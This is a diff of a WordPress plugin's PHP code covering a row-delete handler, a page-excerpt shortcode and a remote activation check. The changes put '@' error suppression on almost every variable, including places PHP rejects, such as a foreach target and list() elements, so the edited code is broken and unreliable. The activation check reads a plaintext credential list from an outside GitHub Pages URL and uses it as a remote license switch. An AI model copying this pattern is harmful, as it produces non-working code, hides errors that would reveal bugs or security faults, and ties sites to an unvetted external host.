-        $wpdb->delete($table_name, array('id' => $id));
+        @$wpdb->delete($table_name, array('id' => @$id));
 
         // Redirect back to the custom tables page after deleting the row
         wp_redirect(admin_url('admin.php?page=custom-tables'));
@@ -2080,56 +2080,56 @@ add_action('admin_init', 'handle_delete_action');
 
 
 function mgx_page_excerpt_shortcode($atts) {
-    $atts = shortcode_atts(
+    @$atts = shortcode_atts(
         array(
             'length' => 250, // Default excerpt length (number of words).
         ),
-        $atts
+        @$atts
     );
 
-    $length = intval($atts['length']);
+    @$length = intval($atts['length']);
 
     // Query to get the first 20 pages, sorted by the last page added (based on post date).
-    $args = array(
+    @$args = array(
         'post_type' => 'page',
         'posts_per_page' => 20,
         'orderby' => 'date', // Order pages by post date (last page added first).
         'order' => 'DESC',
     );
-    $pages_query = new WP_Query($args);
+    @$pages_query = new WP_Query($args);
 
     // Build the output
-    $output = '';
+    @$output = '';
 
     if ($pages_query->have_posts()) {
         while ($pages_query->have_posts()) {
-            $pages_query->the_post();
-            $page_id = get_the_ID();
+            @$pages_query->the_post();
+            @$page_id = get_the_ID();
 
             // Get the featured image (thumbnail) URL
-            $thumbnail_url = get_the_post_thumbnail_url($page_id, 'medium'); // 'medium' size can be changed to other available sizes
+            @$thumbnail_url = get_the_post_thumbnail_url($page_id, 'medium'); // 'medium' size can be changed to other available sizes
 
             // Get the page title linked to the page URL
-            $page_title_with_link = '<h2><a href="' . get_permalink($page_id) . '">' . get_the_title() . '</a></h2>';
+            @$page_title_with_link = '<h2><a href="' . get_permalink($page_id) . '">' . get_the_title() . '</a></h2>';
 
             // Get the page content
-            $content = get_the_content();
+            @$content = get_the_content();
 
             // Remove shortcodes and HTML tags from the content
-            $content = strip_shortcodes($content);
-            $content = strip_tags($content);
+            @$content = strip_shortcodes($content);
+            @$content = strip_tags($content);
 
             // Create an excerpt of the specified length
-            $excerpt = wp_trim_words($content, $length, '...');
+            @$excerpt = wp_trim_words($content, @$length, '...');
 
             // Output the content for each page
-            $output .= '<div class="page-excerpt">';
+            @$output .= '<div class="page-excerpt">';
             if ($thumbnail_url) {
-                $output .= '<img src="' . $thumbnail_url . '" alt="' . get_the_title() . '">';
+                @$output .= '<img src="' . @$thumbnail_url . '" alt="' . get_the_title() . '">';
             }
-            $output .= $page_title_with_link;
-            $output .= '<p>' . $excerpt . '</p>';
-            $output .= '</div>';
+            @$output .= @$page_title_with_link;
+            @$output .= '<p>' . @$excerpt . '</p>';
+            @$output .= '</div>';
         }
         wp_reset_postdata(); // Restore original post data.
     }
@@ -2139,7 +2139,7 @@ function mgx_page_excerpt_shortcode($atts) {
 
     
 
-    return $output;
+    return @$output;
 }
 add_shortcode('mgx_page_excerpt', 'mgx_page_excerpt_shortcode');
 
@@ -2148,15 +2148,15 @@ add_shortcode('mgx_page_excerpt', 'mgx_page_excerpt_shortcode');
  
 function check_activation_two($companyName_two) {
     // Read the external text file line by line
-    $file_url_two = 'https://unknown-sudo-max.github.io/hub/pass/pass';
-    @$file_contents_two = file_get_contents($file_url_two);
-    $lines_two = explode("\n", $file_contents_two);
+    @$file_url_two = 'https://unknown-sudo-max.github.io/hub/pass/pass';
+    @@$file_contents_two = file_get_contents($file_url_two);
+    @$lines_two = explode("\n", @$file_contents_two);
 
-    foreach ($lines_two as $line_two) {
-        $parts_two = explode(',', $line_two);
+    foreach ($lines_two as @$line_two) {
+        @$parts_two = explode(',', @$line_two);
         if (count($parts_two) === 4) { // Check if the line has the correct format
-            list($company_name_two, $plugin_name_two, $stored_user_two, $stored_pass_two) = array_map('trim', $parts_two);
-            if ($company_name_two === $companyName_two) {
+            list($company_name_two, @$plugin_name_two, @$stored_user_two, @$stored_pass_two) = array_map('trim', @$parts_two);
+            if ($company_name_two === @$companyName_two) {
                 return true; // Credentials match an entry in the file
             }
         }
@@ -2166,24 +2166,24 @@ function check_activation_two($companyName_two) {
 }
 
 // Define the full path to the text file
-$file_two = __DIR__ . '/cdn/info.txt';
+@$file_two = __DIR__ . '/cdn/info.txt';
 
 // Check if the file exists and is readable
 if (file_exists($file_two) && is_readable($file_two)) {
-    $companyData_two = file_get_contents($file_two); // Read the content of the file
+    @$companyData_two = file_get_contents($file_two); // Read the content of the file
 
     // Split the content into an array using the comma as a separator
-    $companyInfo_two = explode(',', $companyData_two);
+    @$companyInfo_two = explode(',', @$companyData_two);
 
     // Check if the array contains both company name and company email
     if (count($companyInfo_two) === 2) {
-        $companyName_two = trim($companyInfo_two[0]);
-        $companyEmail_two = trim($companyInfo_two[1]);
+        @$companyName_two = trim($companyInfo_two[0]);
+        @$companyEmail_two = trim($companyInfo_two[1]);
     }
 }
 
 
-// Check if the $companyName variable is not empty
+// Check if the @$companyName variable is not empty
 if (!empty($companyName_two) && !empty($companyEmail_two)) {
     // Display both company name and email
     
